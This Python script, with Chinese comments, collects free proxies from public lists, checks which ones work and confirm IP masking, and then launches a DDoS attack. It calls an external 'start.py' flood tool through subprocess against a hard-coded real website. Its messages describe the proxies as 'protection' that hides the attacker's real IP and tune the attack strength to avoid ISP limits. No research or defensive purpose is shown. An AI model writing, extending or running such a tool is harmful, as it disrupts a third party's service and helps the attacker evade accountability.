#!/usr/bin/env python3
"""
有效代理查找工具
找到真正可用的代理服务器
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def find_working_proxies():
    """查找真正可用的代理"""
    print("🔍 查找可用的代理服务器...")
    
    # 多个代理源
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
    ]
    
    all_proxies = set()
    
    for source in proxy_sources:
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                proxies = response.text.strip().split('\n')
                for proxy in proxies:
                    proxy = proxy.strip()
                    if proxy and ':' in proxy and not proxy.startswith('#'):
                        # 标准化格式
                        if 'http://' in proxy:
                            proxy = proxy.replace('http://', '')
                        all_proxies.add(proxy)
                print(f"✅ 从源获取 {len(proxies)} 个代理")
        except Exception as e:
            print(f"❌ 源 {source} 获取失败: {e}")
    
    print(f"📊 总共收集到 {len(all_proxies)} 个代理")
    
    # 测试代理可用性
    working_proxies = []
    
    def test_proxy(proxy):
        try:
            # 使用更宽松的超时设置
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            # 使用更简单的测试目标
            response = requests.get('http://google.com', proxies=proxies, timeout=8)
            if response.status_code in [200, 301, 302]:
                return proxy
        except:
            pass
        return None
    
    # 并行测试
    print("🔧 测试代理可用性...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(test_proxy, list(all_proxies)))
    
    working_proxies = [proxy for proxy in results if proxy]
    print(f"✅ 找到 {len(working_proxies)} 个可用代理")
    
    # 保存到文件
    if working_proxies:
        with open('files/proxies/working_proxies.txt', 'w', encoding='utf-8') as f:
            for proxy in working_proxies:
                f.write(f"http://{proxy}\n")
        print("💾 可用代理已保存到 files/proxies/working_proxies.txt")
    
    return working_proxies

def test_protection_with_proxies(proxies):
    """使用找到的代理测试保护效果"""
    if not proxies:
        print("❌ 没有可用代理")
        return False
    
    print("\n🔒 测试代理保护效果...")
    
    # 获取真实IP
    try:
        response = requests.get('http://httpbin.org/ip', timeout=5)
        real_ip = response.json().get('origin', '未知')
        print(f"📡 您的真实IP: {real_ip}")
    except:
        print("❌ 无法获取真实IP")
        return False
    
    # 测试前5个代理
    for i, proxy in enumerate(proxies[:5]):
        try:
            proxies_config = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            response = requests.get('http://httpbin.org/ip', proxies=proxies_config, timeout=5)
            proxy_ip = response.json().get('origin', '未知')
            
            if proxy_ip != real_ip:
                print(f"✅ 代理 {i+1}: {proxy}")
                print(f"🔗 隐藏IP: {proxy_ip}")
                return True
            else:
                print(f"❌ 代理 {i+1}: {proxy} (IP未隐藏)")
        except Exception as e:
            print(f"❌ 代理 {i+1}: {proxy} (连接失败)")
    
    return False

def enable_proxy_protection():
    """启用代理保护"""
    print("\n🛡️ 启用代理保护...")
    
    # 查找可用代理
    working_proxies = find_working_proxies()
    
    if not working_proxies:
        print("❌ 没有找到可用代理")
        return False
    
    # 测试保护效果
    if test_protection_with_proxies(working_proxies):
        print("\n✅ 代理保护已启用")
        print("💡 现在可以安全地进行DDoS攻击")
        return True
    else:
        print("\n❌ 代理保护启用失败")
        return False

def safe_ddos_attack(target_url):
    """安全DDoS攻击"""
    print(f"\n🚀 启动安全DDoS攻击")
    print(f"🎯 目标: {target_url}")
    
    # 使用找到的代理文件
    proxy_file = 'files/proxies/working_proxies.txt'
    
    import subprocess
    try:
        # 使用更安全的攻击参数
        command = f'python start.py GET {target_url} 0 50 {proxy_file} 50 300'
        print(f"📝 攻击命令: {command}")
        
        # 非阻塞运行
        process = subprocess.Popen(command, shell=True)
        print("✅ 攻击已启动 (使用代理保护)")
        print("💡 攻击将在后台运行5分钟")
        
        return process
    except Exception as e:
        print(f"❌ 攻击启动失败: {e}")
        return None

def main():
    target = "https://www.kjqun.cn/"
    
    print("="*60)
    print("🛡️ 有效代理查找工具")
    print("="*60)
    
    # 1. 启用代理保护
    if enable_proxy_protection():
        # 2. 安全攻击
        safe_ddos_attack(target)
        
        print("\n" + "="*60)
        print("📊 攻击状态:")
        print("- 使用代理保护，真实IP已隐藏")
        print("- 攻击强度: 中等 (避免触发ISP限制)")
        print("- 持续时间: 5分钟")
        print("="*60)
    else:
        print("\n❌ 无法启用保护，建议:")
        print("1. 使用VPN服务")
        print("2. 手动配置代理")
        print("3. 降低攻击强度")

if __name__ == "__main__":
    main()